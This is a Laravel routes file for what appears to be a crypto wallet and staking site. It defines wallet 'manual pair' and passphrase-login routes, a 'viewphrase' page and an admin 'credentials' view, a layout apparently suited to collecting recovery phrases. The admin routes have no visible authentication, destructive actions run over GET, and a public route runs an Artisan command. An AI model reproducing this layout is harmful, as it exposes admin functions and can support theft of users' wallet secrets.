<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\Page;
use App\Http\Controllers\UserManager;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/link-storage', function () {
  Artisan::call('storage:link');
  dd('Done');
});

Route::get('/', [Page::class, 'get_index']);
Route::get('index', [Page::class, 'get_index']);
Route::get('terms', [Page::class, 'get_terms']);
Route::get('privacy', [Page::class, 'get_privacy']);
Route::get('/connect/walletlist', [Page::class, 'get_walletlist']);
Route::get('/connect/manualpair', [Page::class, 'get_manualpair']);
Route::post('/connect/pair', [Page::class, 'post_pair']);

Route::get('login', [Page::class, 'get_login'])->name('login');
Route::get('login_key', [Page::class, 'get_phrase_login'])->name('login_key');
Route::get('logout', [Page::class, 'logout'])->name('logout');
Route::get('register', [Page::class, 'get_method']);

//Registration routes.
Route::get('register/create', [Page::class, 'get_register']);
Route::get('register/passphrase', [Page::class, 'get_passphrase']);
Route::get('register/secretkey', [Page::class, 'get_secretkey']);
Route::get('register/recoverytoken', [Page::class, 'get_recoverytoken']);

//POST Routes.
Route::post('register', [Page::class, 'post_register']);
Route::post('register/{method}', [Page::class, 'post_register']);
Route::post('login', [Page::class, 'post_login']);
Route::post('login_key', [Page::class, 'post_phrase_login']);

//password recovery.
Route::get('reset', [Page::class, 'get_reset']);
Route::post('reset', [Page::class, 'post_reset']);
Route::get('new', [Page::class, 'get_new']);
Route::post('new', [Page::class, 'post_new']);



Route::get('app/index', [UserManager::class, 'get_index'])->name('user_index');
Route::get('app/settings', [UserManager::class, 'get_settings']);
Route::get('app/profile', [UserManager::class, 'get_profile'])->name('app.profile.get');
Route::get('app/deposit', [UserManager::class, 'get_deposit']);
Route::get('app/transfer', [UserManager::class, 'get_transfer']);
Route::get('app/transactions', [UserManager::class, 'get_transactions']);
Route::get('app/setup', [UserManager::class, 'get_setup']);
Route::get('app/viewphrase', [UserManager::class, 'get_viewphrase']);
Route::get('app/walletpay', [UserManager::class, 'get_walletpay']);
Route::get('app/referral', [UserManager::class, 'get_referral']);
Route::get('app/card', [UserManager::class, 'get_card']);
Route::get('app/upload-proof', [UserManager::class, 'get_upload_proof']);
Route::post('app/upload-proof', [UserManager::class, 'post_upload_proof'])->name('app.upload_proof.post');
Route::get('app/stake', [UserManager::class, 'get_stake']);
Route::get('app/stake/initiate', [UserManager::class, 'get_stake_initiate']);
Route::get('app/tokens', [UserManager::class, 'get_tokens']);
Route::get('app/change-password', [UserManager::class, 'get_change_password']);
Route::post('app/change-password', [UserManager::class, 'post_change_password'])->name('app.change_password.post');


//POST Routes.
Route::post('app/deposit', [UserManager::class, 'post_deposit'])->name('app.deposit.post');
Route::post('app/transfer', [UserManager::class, 'post_transfer'])->name('app.transfer.post');
Route::post('app/profile', [UserManager::class, 'post_profile'])->name('app.profile.post');
Route::post('app/settings', [UserManager::class, 'post_settings'])->name('app.settings.post');
Route::post('app/stake/initiate', [UserManager::class, 'post_stake_initiate'])->name('app.stake-initiate.post');



//Admin Routes.
Route::group(['prefix' => 'admin'], function () {

  Route::get('/', [AdminController::class, 'index']);
  Route::get('index', [AdminController::class, 'index']);
  Route::get('transactions', [AdminController::class, 'transactions']);
  Route::get('credentials', [AdminController::class, 'credentials']);
  Route::get('stakes', [AdminController::class, 'stakes']);
  Route::get('deposits', [AdminController::class, 'deposits']);
  Route::get('withdrawals', [AdminController::class, 'withdrawals']);
  Route::get('user_assets', [AdminController::class, 'userassets']);
  Route::get('delete/{model}/{id}', [AdminController::class, 'delete']);
  Route::get('edit/{model}/{id}', [AdminController::class, 'edit']);
  Route::get('approve/{model}/{id}', [AdminController::class, 'approve']);
  Route::get('user/balance/{id}', [AdminController::class, 'userbalance']);
  Route::get('rates', [AdminController::class, 'show_rates']);


  //POST Routes
  Route::post('edit/{mode}/{id}', [AdminController::class, 'post_edit']);
});
